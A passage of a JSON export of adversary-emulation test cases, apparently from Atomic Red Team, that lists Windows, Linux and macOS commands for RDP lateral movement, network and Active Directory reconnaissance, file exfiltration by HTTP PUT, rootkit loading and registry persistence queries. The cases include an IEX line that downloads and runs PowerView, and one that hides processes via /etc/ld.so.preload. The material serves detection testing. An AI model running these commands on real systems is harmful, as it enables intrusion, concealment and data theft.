\n | logonserver | ComputerName argument default %logonserver% | String | $ENV:logonserver.TrimStart(\"\\\") | \n | domain | domain argument default %USERDOMAIN% | String | $Env:USERDOMAIN | \n | username | Username argument default %username% | String | $ENV:USERNAME | \n | password | Password | String | 1password2! | "}, "executionSteps": [{"description": "$Server=#{logonserver}\n$User = Join-Path #{domain} #{username}\n$Password=\"#{password}\"\ncmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password\nmstsc /v:$Server\necho \"RDP connection established\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6rs03sx29mqhyr3a3zo", "clacwm2bo00qq29mq4tv4e8z1"], "tags": []}, {"data": {"name": "Changing RDP Port to Non Standard Port via Powershell", "shortName": "T1021.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Changing RDP Port to Non Standard Port via Remote Desktop Application over Powershell\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | OLD_Remote_Port | Default RDP Listening Port | String | 3389 | \n | NEW_Remote_Port | New RDP Listening Port | String | 4489 | "}, "executionSteps": [{"description": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value #{NEW_Remote_Port}\nNew-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rs03sx29mqhyr3a3zo"], "tags": []}, {"data": {"name": "Changing RDP Port to Non Standard Port via Command_Prompt", "shortName": "T1021.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Changing RDP Port to Non Standard Port via Command_Prompt\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | OLD_Remote_Port | Default RDP Listening Port | String | 3389 | \n | NEW_Remote_Port | New RDP Listening Port | String | 4489 | "}, "executionSteps": [{"description": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d #{NEW_Remote_Port} -f\nnetsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\" dir=in action=allow protocol=TCP localport=#{NEW_Remote_Port}\n", "successCriteria": null}], "techniqueIds": ["clacwm6rs03sx29mqhyr3a3zo"], "tags": []}, {"data": {"name": "IcedID Botnet HTTP PUT", "shortName": "T1020", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file | Exfiltration File | String | C:\\temp\\T1020_exfilFile.txt | \n | domain | Destination Domain | Url | https://google.com | "}, "executionSteps": [{"description": "$fileName = \"#{file}\"\n$url = \"#{domain}\"\n$file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"\n$contentType = \"application/octet-stream\"\ntry {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}", "successCriteria": null}], "techniqueIds": ["clacwm6ad039a29mq1m6y5d9l", "clacwm1e0003729mq3w1rf384"], "tags": []}, {"data": {"name": "Remote System Discovery - sweep", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | start_host | Subnet used for ping sweep. | String | 1 | \n | stop_host | Subnet used for ping sweep. | String | 254 | \n | subnet | Subnet used for ping sweep. | String | 192.168.1 | "}, "executionSteps": [{"description": "for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo \"#{subnet}.$ip UP\" || : ; done\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu", "clacwm2bw00qy29mq9blm0i35"], "tags": []}, {"data": {"name": "Remote System Discovery - ping sweep", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | start_host | Last octet starting value for ping sweep. | String | 1 | \n | stop_host | Last octet ending value for ping sweep. | String | 254 | \n | subnet | Subnet used for ping sweep. | String | 192.168.1 | "}, "executionSteps": [{"description": "for /l %i in (#{start_host},1,#{stop_host}) do ping -n 1 -w 100 #{subnet}.%i  \n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu", "clacwm2bw00qy29mq9blm0i35"], "tags": []}, {"data": {"name": "Remote System Discovery - nslookup", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]\n$pieces = $localip.split(\".\")\n$firstOctet = $pieces[0]\n$secondOctet = $pieces[1]\n$thirdOctet = $pieces[2]\nforeach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu", "clacwm2bw00qy29mq9blm0i35"], "tags": []}, {"data": {"name": "Remote System Discovery - nltest", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify domain controllers for specified domain.\n\nUpon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | target_domain | Domain to query for domain controllers | String | %userdnsdomain% | "}, "executionSteps": [{"description": "nltest.exe /dclist:#{target_domain}\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu", "clacwm2bw00qy29mq9blm0i35"], "tags": []}, {"data": {"name": "Remote System Discovery - net group Domain Computers", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify remote systems with net.exe querying the Active Directory Domain Computers group.\n\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Computers\" group. Output will be via stdout.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net group \"Domain Computers\" /domain\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu", "clacwm2bw00qy29mq9blm0i35"], "tags": []}, {"data": {"name": "Remote System Discovery - net", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify remote systems with net.exe.\n\nUpon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "net view /domain\nnet view\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu", "clacwm2bw00qy29mq9blm0i35"], "tags": []}, {"data": {"name": "Remote System Discovery - ip tcp_metrics", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use the ip tcp_metrics command to display the recent cached entries for IPv4 and IPv6 source and destination addresses. \n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "ip tcp_metrics show |grep --invert-match \"^127\\.\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu"], "tags": []}, {"data": {"name": "Remote System Discovery - ip route", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use the ip route command to display the kernels routing tables. \n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "ip route show\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu"], "tags": []}, {"data": {"name": "Remote System Discovery - ip neighbour", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use the ip neighbour command to display the known link layer (ARP table) addresses for hosts sharing the same network segment. \n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "ip neighbour show\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu"], "tags": []}, {"data": {"name": "Remote System Discovery - arp nix", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify remote systems via arp.\n\nUpon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.\n\n\n**Supported Platforms:** linux, macos\n\n"}, "executionSteps": [{"description": "arp -a | grep -v '^?'\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu", "clacwm2bw00qy29mq9blm0i35"], "tags": []}, {"data": {"name": "Remote System Discovery - arp", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify remote systems via arp. \n\nUpon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "arp -a\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu", "clacwm2bw00qy29mq9blm0i35"], "tags": []}, {"data": {"name": "Remote System Discovery - adidnsdump", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks\nPython 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.\nSuccessful execution of this test will list dns zones in the terminal.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | user_name | username including domain. | String | domain\\user | \n | acct_pass | Account password. | String | password | \n | host_name | hostname or ip address to connect to. | String | 192.168.1.1 | "}, "executionSteps": [{"description": "adidnsdump -u #{user_name} -p #{acct_pass} --print-zones #{host_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu", "clacwm2bw00qy29mq9blm0i35"], "tags": []}, {"data": {"name": "Get-wmiobject to Enumerate Domain Controllers", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.\nUpon successful execution a listing of Systems from AD will output with their paths.\nReference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "get-wmiobject -class ds_computer -namespace root\\directory\\ldap\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu"], "tags": []}, {"data": {"name": "Get-DomainController with PowerView", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu"], "tags": []}, {"data": {"name": "Enumerate domain computers within Active Directory using DirectorySearcher", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. \nThis test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. \nReference: [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). \nUpon successful execution, this test will output the names of the computers that reside on the domain to the console window. \n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(\"(ObjectCategory=Computer)\")\n$DirectorySearcher.PropertiesToLoad.Add(\"Name\")\n$Computers = $DirectorySearcher.findall()\nforeach ($Computer in $Computers) {\n  $Computer = $Computer.Properties.name\n  if (!$Computer) { Continue }\n  Write-Host $Computer}\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu"], "tags": []}, {"data": {"name": "Enumerate Active Directory Computers with Get-AdComputer", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.\nUpon successful execution a listing of Computers will output with their paths in AD.\nReference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Get-AdComputer -Filter *\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu"], "tags": []}, {"data": {"name": "Enumerate Active Directory Computers with ADSISearcher", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.\nUpon successful execution a listing of computers will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "([adsisearcher]\"objectcategory=computer\").FindAll(); ([adsisearcher]\"objectcategory=computer\").FindOne()\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu"], "tags": []}, {"data": {"name": "Adfind - Enumerate Active Directory Domain Controller Objects", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | adfind_path | Path to the AdFind executable | Path | PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe | "}, "executionSteps": [{"description": "#{adfind_path} -sc dclist\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu", "clacwm2bw00qy29mq9blm0i35"], "tags": []}, {"data": {"name": "Adfind - Enumerate Active Directory Computer Objects", "shortName": "T1018", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | adfind_path | Path to the AdFind executable | Path | PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe | "}, "executionSteps": [{"description": "#{adfind_path} -f (objectcategory=computer)\n", "successCriteria": null}], "techniqueIds": ["clacwm6qr03rn29mqhz7o3zsu", "clacwm2bw00qy29mq9blm0i35"], "tags": []}, {"data": {"name": "System Network Configuration Discovery on Windows", "shortName": "T1016", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify network configuration information\n\nUpon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "ipconfig /all\nnetsh interface show interface\narp -a\nnbtstat -n\nnet config\n", "successCriteria": null}], "techniqueIds": ["clacwm69g038a29mqhe31hhh3", "clacwm2i500w829mq80jja2oa"], "tags": []}, {"data": {"name": "System Network Configuration Discovery (TrickBot Style)", "shortName": "T1016", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify network configuration information as seen by Trickbot and described here https://www.sneakymonkey.net/2019/10/29/trickbot-analysis-part-ii/\n\nUpon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "ipconfig /all\nnet config workstation\nnet view /all /domain\nnltest /domain_trusts\n", "successCriteria": null}], "techniqueIds": ["clacwm69g038a29mqhe31hhh3", "clacwm2i500w829mq80jja2oa"], "tags": []}, {"data": {"name": "System Network Configuration Discovery", "shortName": "T1016", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify network configuration information.\n\nUpon successful execution, sh will spawn multiple commands and output will be via stdout.\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "if [ -x \"$(command -v arp)\" ]; then arp -a; else echo \"arp is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ifconfig)\" ]; then ifconfig; else echo \"ifconfig is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v ip)\" ]; then ip addr; else echo \"ip is missing from the machine. skipping...\"; fi;\nif [ -x \"$(command -v netstat)\" ]; then netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c; else echo \"netstat is missing from the machine. skipping...\"; fi;\n", "successCriteria": null}], "techniqueIds": ["clacwm69g038a29mqhe31hhh3", "clacwm2i500w829mq80jja2oa"], "tags": []}, {"data": {"name": "Qakbot Recon", "shortName": "T1016", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "A list of commands known to be performed by Qakbot for recon purposes\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | recon_commands | File that houses list of commands to be executed | Path | PathToAtomicsFolder\\T1016\\src\\qakbot.bat | "}, "executionSteps": [{"description": "#{recon_commands}\n", "successCriteria": null}], "techniqueIds": ["clacwm69g038a29mqhe31hhh3", "clacwm2i500w829mq80jja2oa"], "tags": []}, {"data": {"name": "List Windows Firewall Rules", "shortName": "T1016", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Enumerates Windows Firewall Rules using netsh.\n\nUpon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "netsh advfirewall firewall show rule name=all\n", "successCriteria": null}], "techniqueIds": ["clacwm69g038a29mqhe31hhh3", "clacwm2i500w829mq80jja2oa"], "tags": []}, {"data": {"name": "List Open Egress Ports", "shortName": "T1016", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This is to test for what ports are open outbound.  The technique used was taken from the following blog:\nhttps://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/\n\nUpon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\\open-ports.txt.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path of file to write port scan results | Path | $env:USERPROFILE\\Desktop\\open-ports.txt | \n | portfile_url | URL to top-128.txt | Url | https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1016/src/top-128.txt | \n | port_file | The path to a text file containing ports to be scanned, one port per line. The default list uses the top 128 ports as defined by Nmap. | Path | PathToAtomicsFolder\\T1016\\src\\top-128.txt | "}, "executionSteps": [{"description": "$ports = Get-content #{port_file}\n$file = \"#{output_file}\"\n$totalopen = 0\n$totalports = 0\nNew-Item $file -Force\nforeach ($port in $ports) {\n    $test = new-object system.Net.Sockets.TcpClient\n    $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null)\n    $wait.asyncwaithandle.waitone(250, $false) | Out-Null\n    $totalports++ | Out-Null\n    if ($test.Connected) {\n        $result = \"$port open\" \n        Write-Host -ForegroundColor Green $result\n        $result | Out-File -Encoding ASCII -append $file\n        $totalopen++ | Out-Null\n    }\n    else {\n        $result = \"$port closed\" \n        Write-Host -ForegroundColor Red $result\n        $totalclosed++ | Out-Null\n        $result | Out-File -Encoding ASCII -append $file\n    }\n}\n$results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"\n$results | Out-File -Encoding ASCII -append $file\nWrite-Host $results\n", "successCriteria": null}], "techniqueIds": ["clacwm69g038a29mqhe31hhh3", "clacwm2i500w829mq80jja2oa"], "tags": []}, {"data": {"name": "List macOS Firewall Rules", "shortName": "T1016", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "\"This will test if the macOS firewall is enabled and/or show what rules are configured. Must be run with elevated privileges. Upon successful execution, these commands will output various information about the firewall configuration, including status and specific port/protocol blocks or allows. \n\nUsing `defaults`, additional arguments can be added to see filtered details, such as `globalstate` for global configuration (\\\"Is it on or off?\\\"), `firewall` for common application allow rules, and `explicitauths` for specific rules configured by the user. \n\nUsing `socketfilterfw`, flags such as --getglobalstate or --listapps can be used for similar filtering. At least one flag is required to send parseable output to standard out. \n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "sudo defaults read /Library/Preferences/com.apple.alf\nsudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\n", "successCriteria": null}], "techniqueIds": ["clacwm69g038a29mqhe31hhh3", "clacwm2i500w829mq80jja2oa"], "tags": []}, {"data": {"name": "Adfind - Enumerate Active Directory Subnet Objects", "shortName": "T1016", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Subnet Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | adfind_path | Path to the AdFind executable | Path | PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe | "}, "executionSteps": [{"description": "#{adfind_path} -f (objectcategory=subnet)\n", "successCriteria": null}], "techniqueIds": ["clacwm69g038a29mqhe31hhh3", "clacwm2i500w829mq80jja2oa"], "tags": []}, {"data": {"name": "Windows Signed Driver Rootkit Test", "shortName": "T1014", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test exploits a signed driver to execute code in Kernel.\nThis example was curated from a blog that utilizes puppetstrings.exe with the vulnerable (signed driver) capcom.sys. \nThe capcom.sys driver may be found on github. A great reference is here: http://www.fuzzysecurity.com/tutorials/28.html\nSHA1 C1D5CF8C43E7679B782630E93F5E6420CA1749A7\nWe leverage the work done here:\nhttps://zerosum0x0.blogspot.com/2017/07/puppet-strings-dirty-secret-for-free.html\nThe hash of our PoC Exploit is\nSHA1 DD8DA630C00953B6D5182AA66AF999B1E117F441\nThis will simulate hiding a process.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | driver_path | Path to a vulnerable driver | Path | C:\\Drivers\\driver.sys | \n | puppetstrings_path | Path of puppetstrings.exe | Path | PathToAtomicsFolder\\T1014\\bin\\puppetstrings.exe | "}, "executionSteps": [{"description": "#{puppetstrings_path} #{driver_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm2ci00rd29mq1ylf79lq"], "tags": []}, {"data": {"name": "Loadable Kernel Module based Rootkit (Diamorphine)", "shortName": "T1014", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Loads Diamorphine kernel module, which hides itself and a processes.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | repo | Url of the diamorphine github repo | String | https://github.com/m0nad/Diamorphine/ | \n | rev | Revision of the github repo zip | String | 898810523aa2033f582a4a5903ffe453334044f9 | \n | rootkit_path | Path To rootkit | String | /tmp/atomic/Diamorphine | \n | rootkit_name | Module name | String | diamorphine | "}, "executionSteps": [{"description": "sudo modprobe #{rootkit_name}\nping -c 10 localhost >/dev/null & TARGETPID=\"$!\"\nps $TARGETPID\nkill -31 $TARGETPID\nps $TARGETPID || echo \"process ${TARGETPID} hidden\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5r702po29mqga8ohsgg"], "tags": []}, {"data": {"name": "Loadable Kernel Module based Rootkit", "shortName": "T1014", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Loadable Kernel Module based Rootkit\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | rootkit_source_path | Path to the rootkit source. Used when prerequistes are fetched. | path | PathToAtomicsFolder/T1014/src/Linux | \n | rootkit_path | Path To rootkit | String | PathToAtomicsFolder/T1014/bin/T1014.ko | \n | rootkit_name | Module name | String | T1014 | \n | temp_folder | Temp folder used to compile the code. Used when prerequistes are fetched. | path | /tmp/T1014 | "}, "executionSteps": [{"description": "sudo insmod #{rootkit_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm2ci00rd29mq1ylf79lq"], "tags": []}, {"data": {"name": "Loadable Kernel Module based Rootkit", "shortName": "T1014", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Loadable Kernel Module based Rootkit\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | rootkit_source_path | Path to the rootkit source. Used when prerequistes are fetched. | Path | PathToAtomicsFolder/T1014/src/Linux | \n | rootkit_path | Path To rootkit | String | PathToAtomicsFolder/T1014/bin | \n | rootkit_name | Module name | String | T1014 | "}, "executionSteps": [{"description": "sudo modprobe #{rootkit_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm5r702po29mqga8ohsgg", "clacwm2ci00rd29mq1ylf79lq"], "tags": []}, {"data": {"name": "dynamic-linker based rootkit (libprocesshider)", "shortName": "T1014", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ls.so.preload (see also T1574.006).\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | repo | Url of the github repo zip | String | https://github.com/gianlucaborello/libprocesshider/ | \n | rev | Revision of the github repo zip | String | 25e0587d6bf2137f8792dc83242b6b0e5a72b415 | \n | library_path | Full path of the library to add to ld.so.preload | String | /usr/local/lib/libprocesshider.so | "}, "executionSteps": [{"description": "echo #{library_path} | tee -a /etc/ld.so.preload\n/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo \"process hidden\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5r702po29mqga8ohsgg"], "tags": []}, {"data": {"name": "Query Registry", "shortName": "T1012", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Query Windows Registry.\nUpon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).\nReferences:\nhttps://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\nhttps://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services\nhttp://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf\nhttps://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\nreg query 